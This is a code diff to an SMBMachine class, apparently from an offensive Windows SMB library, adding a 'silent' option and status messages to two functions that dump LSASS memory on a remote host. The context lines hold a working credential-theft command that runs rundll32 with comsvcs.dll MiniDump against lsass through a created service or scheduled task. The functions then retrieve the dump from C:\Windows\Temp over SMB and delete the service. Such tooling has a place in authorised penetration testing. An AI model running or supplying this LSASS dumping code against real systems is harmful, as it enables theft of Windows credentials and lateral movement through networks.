@@ -516,7 +516,7 @@ class SMBMachine:
 		return res, err
 	
 	@req_servicemanager
-	async def service_dump_lsass(self, lsass_file_name = None):
+	async def service_dump_lsass(self, lsass_file_name = None, silent = False):
 		if lsass_file_name is None:
 			lsass_file_name = os.urandom(4).hex() + '.arj'
 		command = "powershell.exe -NoP -C \"%%windir%%\\System32\\rundll32.exe %%windir%%\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id \\Windows\\Temp\\%s full;Wait-Process -Id (Get-Process rundll32).id\"" % lsass_file_name
@@ -535,6 +535,9 @@ class SMBMachine:
 			if err is not None:
 				raise err
 			
+			if silent is False:
+				print('[%s] Service created with name: %s' % (self.connection.target.get_hostname_or_ip(), service_name))
+			
 			_, err = await self.start_service(service_name)
 
 			for _ in range(5):
@@ -543,6 +546,8 @@ class SMBMachine:
 				_, err = await temp.open(self.connection)
 				if err is not None:
 					continue
+				if silent is False:
+					print('[%s] Dump file is now accessible here: C:\\Windows\\Temp\\%s' % (self.connection.target.get_hostname_or_ip(), lsass_file_name))
 				return temp, None
 
 			return None, err
@@ -552,6 +557,11 @@ class SMBMachine:
 			_, err = await self.delete_service(service_name)
 			if err is not None:
 				logger.debug('Failed to delete service!')
+				if silent is False:
+					print('[%s] Failed to remove service: %s' % (self.connection.target.get_hostname_or_ip(), service_name))
+			else:
+				if silent is False:
+					print('[%s] Removed service: %s' % (self.connection.target.get_hostname_or_ip(), service_name))
 
 	@req_servicemanager_gen
 	async def service_cmd_exec(self, command, display_name = None, service_name = None):
@@ -701,17 +711,21 @@ class SMBMachine:
 
 	
 	@req_tsch
-	async def task_dump_lsass(self, lsass_file_name = None):
+	async def task_dump_lsass(self, lsass_file_name = None, silent = False):
 		if lsass_file_name is None:
 			lsass_file_name = os.urandom(4).hex() + '.arj'
 		command = "powershell.exe -NoP -C \"%%windir%%\\System32\\rundll32.exe %%windir%%\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id \\Windows\\Temp\\%s full;Wait-Process -Id (Get-Process rundll32).id\"" % lsass_file_name
 
 		logger.debug('Command: %s' % command)
+		
 		#return None, None
 		try:
 			res, err = await self.tasks_execute_commands([command])
 			if err is not None:
 				raise err
+			
+			if silent is False:
+				print('[%s] Dumping task created on remote end, now waiting...' % self.connection.target.get_hostname_or_ip())
 
 			for _ in range(5):
 				await asyncio.sleep(5)
@@ -719,6 +733,8 @@ class SMBMachine:
 				_, err = await temp.open(self.connection)
 				if err is not None:
 					continue
+				if silent is False:
+					print('[%s] Remote file location: C:\\Windows\\Temp\\%s' % (self.connection.target.get_hostname_or_ip() ,lsass_file_name))
 				return temp, None
 
 			return None, err
